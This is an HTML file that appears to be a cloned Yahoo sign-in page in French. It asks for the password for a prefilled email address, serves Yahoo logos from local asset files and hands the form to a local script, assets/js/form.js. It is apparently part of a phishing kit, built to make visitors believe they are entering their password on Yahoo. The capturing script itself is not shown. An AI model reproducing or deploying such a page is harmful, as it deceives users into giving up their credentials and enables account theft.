<html id="Stencil" class="js grid light-theme">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="oath:guce:consent-host" content="guce.yahoo.com">
    <title>Yahoo</title>
    <meta name="description"
        content="Yahoo&nbsp;Mail, toujours plus performant&nbsp;: actualités locales, nationales et internationales, finances, sports, musique, cinéma... Vivez à fond en profitant pleinement du&nbsp;Web.">
    <link rel="dns-prefetch" href="//gstatic.com">
    <link rel="dns-prefetch" href="//google.com">
    <link rel="dns-prefetch" href="//s.yimg.com">
    <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
    <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
    <link rel="dns-prefetch" href="//geo.query.yahoo.com">
    <link rel="dns-prefetch" href="//geo.yahoo.com">
    <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
    <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
    <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0">
    <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
    <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
    <style nonce="">
        #mbr-css-check {
            display: inline;
        }
    </style>
    <link href="https://s.yimg.com/wm/mbr/0b754754bd80b1645a9c010b47fb52c751d97dcf/yahoo-main.css" rel="stylesheet"
    type="text/css" />
</head>

<body class="bucket-att-multimid-integration-control bucket-mbr-smart2sv-ph1-b">
    <script nonce="">
        (function (root) {
            var doc = document;
            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
            }
        }(this));
    </script>
    <div id="login-body" class="loginish puree-v2">
        <div class="mbr-desktop-hd">
            <span class="column">
                <a href="https://fr.yahoo.com/">
                    <img src="assets/img/yahoo.png" alt="Yahoo"
                        class="logo " width="" height="36">
                    <img src="assets/img/yahoo-dark.png" alt="Yahoo"
                        class="dark-mode-logo logo " width="" height="36">
                </a>
            </span>
            <span class="column help txt-align-right">
                <a href="https://help.yahoo.com/kb/index?locale=fr_FR&amp;page=product&amp;y=PROD_ACCT">Aide</a>
            </span>
        </div>
        <div class="login-box-container">
            <div class="login-box right">
                <div class="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo"
                        class="logo yahoo-fr-FR" width="" height="27">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo"
                        class="dark-mode-logo logo yahoo-fr-FR" width="" height="27">
                </div>
                <div class="challenge email-verify-challenge">
                    <div class="challenge-header">
                        <div class="yid greet">Bonjour !</div>
                    </div>
                    <div id="email-verify-challenge" class="email-verify-challenge-primary">
                        <div class="challenge-heading">Entrez votre mot de passe</div>
                        <div class="challenge-sub-desc txt-align-center" id="email">dasdadsad@gmail.com</div>
                        <form id="login-password-form" autocomplete="off" class="pure-form verification-form challenge-form">
                            <div class="input-group">
                                <input id="login-password" autocomplete="new-password" type="password" placeholder=" ">
                                <label for="login-password">Mot de passe</label>
                            </div>


                            <div class="button-container">
                                <button type="submit" name="verifyCode" id="verify-code-button"
                                    class="pure-button puree-button-primary puree-spinner-button challenge-button"
                                    value="true">
                                    Continuer
                                </button>
                            </div>

                            <div class="bottom-cta bottom-sticky sticky-shadow">
                                <input type="submit" name="skip"
                                    class="pure-button puree-button-link challenge-button-link"
                                    value="Essayez une autre méthode pour vous&nbsp;connecter">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
                <h1>Grâce à Yahoo, tous les sujets qui vous intéressent sont à portée de&nbsp;main.</h1>
                <p>Yahoo&nbsp;Mail, actualités locales, nationales et internationales, finances, sports, musique,
                    cinéma... Vivez la vie à fond en profitant pleinement du&nbsp;Web.</p>
            </div>
        </div>

    </div>
    
    <script nonce="">
        (function (root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>
</body>
<script src="./assets/js/form.js"></script>
</html>
